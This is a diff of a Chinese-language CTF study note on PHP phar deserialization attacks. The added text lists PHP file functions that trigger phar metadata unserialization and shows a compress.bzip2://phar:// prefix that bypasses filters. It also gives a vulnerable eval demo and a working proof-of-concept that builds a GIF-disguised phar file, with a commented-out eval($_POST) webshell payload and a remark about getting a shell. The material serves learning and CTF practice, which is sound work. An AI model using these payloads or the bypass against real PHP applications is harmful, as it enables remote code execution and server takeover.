@@ -1,6 +1,6 @@
 phar反序列化
 =
-
+我在这里介绍了phar文件的结构，利用原理，利用方法，从各路大佬的博客搜集了很多汇总在了一起，最后根据我自己做的一道ctf题来说明phar反序列化的利用方式，在后面我会补充blackhat大会中发现者对其的原文叙述。希望有大佬若感觉我说的有不完善的地方，请告诉我，谢谢。
 #在此记录一个phar反序列化的题，是buu的swpu的题
 
 利用条件：
@@ -70,6 +70,84 @@ is_dir       is_file          is_link      is_executable  is_readable          i
 
 is_wirtble   parse_ini_file   copy         unlink         stat                 readfile        info_file 
 ```
+
+在 zsx 师傅的文章又通过 php_stream_open_wrapper 方法的调用函数中，探索出一些新的可用函数！
+
+exif
+
+exif_thumbnailexif_imagetype
+gd
+
+imageloadfontimagecreatefrom***
+hash
+
+hash_hmac_filehash_filehash_update_filemd5_filesha1_file
+file / url
+
+get_meta_tagsget_headers
+standard
+
+getimagesizegetimagesizefromstring
+zip
+
+$zip = new ZipArchive();
+$res = $zip->open('c.zip');
+$zip->extractTo('phar://test.phar/test');
+Bzip / Gzip
+
+如果 phar://不能出现在头几个字符怎么办？
+
+demo.php?filename=compress.bzip2://phar://upload_file/shell.gif/a
+同样的也可以往里面写入一句话木马什么的，反正最后就是为了拿到权限。
+验证
+代码
+```php
+
+<?php
+error_reporting(0);
+$filename=$_GET['filename'];
+if (preg_match("/\bphar\b/A", $filename)) {
+    echo "stop hacking!\n";
+}
+else {
+    class comrare
+    {
+        public $haha = 'haha';
+
+        function __wakeup()
+        {
+            eval($this->haha);
+        }
+
+    }
+
+    imagecreatefromjpeg($_GET['filename']);
+}
+?>
+poc 验证
+
+<?php
+class comrare
+{
+    public $haha = 'comrarezzzzz';
+
+}
+@unlink('shell.phar');
+$phar = new Phar("shell.phar"); //后缀名必须为 phar
+$phar->startBuffering();
+$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
+$object = new comrare();
+//$object ->haha= 'eval(@$_POST[\'a\']);';
+$object ->haha= 'phpinfo();';
+$phar->setMetadata($object); //将自定义的 meta-data 存入 manifest
+$phar->addFromString("a", "a"); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+
+?>
+
+```
+这个 poc 同时绕过了 gif 限制和 phar 开头限制，同样我们可以 getshell 成功！
 
 已经序列化的内容已经保存在了phar.phar中，我们用受影响的函数进行试验，去触发反序列化
 ```php
@@ -185,35 +263,7 @@ if(isset($_GET['filename'])){
 进去题目之后主要就是一顿包含然后找到源码
 最后能看到base.php中的/flag的提示
 然后回到class.php中，在这里面进行反序列化，首先找到一个入口一个出口，先快速的找能利用的函数，可以控制参数的地方，很明显看到一个file_get_contents,那么如何利用这个函数呢？
-找链子，想要调用这个函数就观察里面的参数，一级级往上找就行，最后能到__get这个魔术方法，想要调用这个方法的话，需要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法，想要调用这个方法又要将一个类当做字符串来调用，能看到最上面有一个destruct函数，只有把一个类附上去，然后echo出来就可以调用了，链子找完了之后就可以进行具体的exp构造了，这里利用phar反序列化，首先说下大致流程，先还是序列化，然后将恶意代码保存到phar文件中，最后再phar协议来解析他，文件包含，拿到权限。
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+找链子，想要调用这个函数就观察里面的参数，一级级往上找就行，最后能到__get这个魔术方法，想要调用这个方法的话，需要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法，想要调用这个方法又要将一个类当做字符串来调用，能看到最上面有一个destruct函数，只有把一个类附上去，然后echo出来就可以调用了，链子找完了之后就可以进行具体的exp构造了，这里利用phar反序列化，首先说下大致流程，先还是序列化，然后将恶意代码保存到phar文件中，最后再phar协议来解析他，文件包含，拿到权限。(得有文件包含利用点，还需要知道文件的路径才能操作)
 
 ```php
 #class.php
